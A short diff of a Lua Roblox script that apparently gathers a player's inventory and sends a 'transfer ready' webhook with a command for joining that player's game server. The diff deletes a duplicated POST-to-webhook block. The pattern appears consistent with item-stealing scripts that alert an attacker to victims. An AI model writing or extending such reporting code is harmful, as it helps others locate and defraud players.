@@ -138,6 +138,7 @@ local function getFullInventory()
 end
 
 -- Detailed Transfer Ready webhook (only when hasTransfer)
+-- Detailed Transfer Ready webhook (only when hasTransfer)
 local function sendDetailedTransfer()
     local jobId = tostring(game.JobId)
     local consoleCode = 'Roblox.GameLauncher.joinGameInstance(' .. PLACE_ID .. ', "' .. jobId .. '")'
@@ -183,18 +184,6 @@ local function sendDetailedTransfer()
         end
     end)
 end
-    pcall(function()
-        if request then
-            request({
-                Url = WU,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HS:JSONEncode(data)
-            })
-        end
-    end)
-end
-
 task.spawn(function()
     task.wait(1.5)
     if hasTransfer then
